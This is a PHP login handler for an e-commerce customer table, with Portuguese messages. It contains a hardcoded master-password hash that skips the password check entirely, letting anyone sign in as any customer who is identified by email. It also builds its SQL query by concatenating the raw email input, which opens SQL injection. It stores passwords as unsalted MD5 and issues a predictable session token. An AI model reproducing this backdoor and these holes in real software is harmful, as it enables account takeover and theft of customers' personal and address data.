<?php
    require_once PATH_MILES_LIBRARY . 'classes/ecommerce/endereco.class.php';
	$email = tdc::r('email');
	$senha = md5(tdc::r('senha'));

	if ($senha != 'bf4d9a9fd8ca63472939edad14a91a8d'){
		$where_senha = " AND senha = '".$senha."' ";
	}else{
		$where_senha = '';
	}

	$sql    = "
        SELECT id,nome,inativo 
        FROM td_ecommerce_cliente
        WHERE email = '".$email."' 
        {$where_senha}
        ORDER BY id DESC
        LIMIT 1;
    ";
	$query  = $conn->query($sql);
	if ($query->rowcount() > 0){
		$linha = $query->fetch();
		
		if ((int)$linha["inativo"] != 0){
            $retorno['status']  = 'error';
            $retorno['msg']     = 'Este cadastro ainda não está ativo, você receberá um e-mail de confirmação.';
            $retorno['code']    = 2;
		}else{
            $customer                   = tdc::pa('td_ecommerce_cliente',$linha["id"]);
            $customer_id                = $customer['id'];
            $_SESSION["userid"] 		= $customer_id;
            $_SESSION["username"] 		= $customer['nome'];
            $_SESSION["autenticado"] 	= 1;
            $_SESSION['token_access']   = md5(date('YmdHis') . $customer_id);

            $endereco                   = new tdEcommerceEndereco();
            $endereco->setCliente($customer_id);
            $retorno['status']          = 'success';
            $retorno['msg']             = 'Autenticação realizada com sucesso';
            $retorno['data']            = array(
                'user'              => $customer,
                'user_address'      => $endereco->getDados(),
                '_token_access'     => $_SESSION['token_access']
            );
        }
	}else{
        $retorno['error']   = 'error';
        $retorno['msg']     = 'Login e/ou Senha Inválido.';
        $retorno['code']    = 1;
	}